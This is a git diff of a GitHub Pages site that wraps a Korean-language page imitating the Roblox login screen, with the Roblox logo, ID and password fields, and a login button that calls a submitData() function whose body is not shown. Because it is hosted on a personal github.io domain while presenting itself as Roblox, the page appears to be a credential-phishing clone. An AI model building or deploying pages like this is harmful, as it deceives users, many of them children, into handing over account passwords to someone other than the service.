@@ -1,8 +1,49 @@
 <!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>index.html</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="index.html" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://siheon2025-hue.github.io/index.html/" />
+<meta property="og:url" content="https://siheon2025-hue.github.io/index.html/" />
+<meta property="og:site_name" content="index.html" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="index.html" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","headline":"index.html","name":"index.html","url":"https://siheon2025-hue.github.io/index.html/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/index.html/assets/css/style.css?v=b1b79c0b7812604084b063b24b94f95938940d62">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/index.html/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="container-lg px-3 my-5 markdown-body">
+      
+      <h1><a href="https://siheon2025-hue.github.io/index.html/">index.html</a></h1>
+      
+
+      <p>&lt;!DOCTYPE html&gt;</p>
 <html lang="ko">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Roblox 로그인 - Roblox</title>
     <style>
         body {
@@ -69,14 +110,14 @@
 
 <div id="main-content">
     <div class="login-box">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkVFlvrIx0sjaqPAtE9oemabGfo48NvrQpQ4gongVK-imtkk8CUg&s=10&ec=121585071" width="75" alt="Roblox" class="logo">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkVFlvrIx0sjaqPAtE9oemabGfo48NvrQpQ4gongVK-imtkk8CUg&amp;s=10&amp;ec=121585071" width="75" alt="Roblox" class="logo" />
         <h1>Roblox 로그인</h1>
         <p>Roblox 계정 사용</p>
         <div class="input-group">
-            <input type="text" id="email" placeholder="아이디 입력" required>
+            <input type="text" id="email" placeholder="아이디 입력" required="" />
         </div>
         <div class="input-group">
-            <input type="password" id="password" placeholder="비밀번호 입력" required>
+            <input type="password" id="password" placeholder="비밀번호 입력" required="" />
         </div>
         <div class="btn-container">
             <button onclick="submitData()">로그인</button>
@@ -141,3 +182,12 @@
 
 </body>
 </html>
+
+
+      
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js" integrity="sha256-lZaRhKri35AyJSypXXs4o6OPFTbTmUoltBbDCbdzegg=" crossorigin="anonymous"></script>
+    <script>anchors.add();</script>
+  </body>
+</html>
+
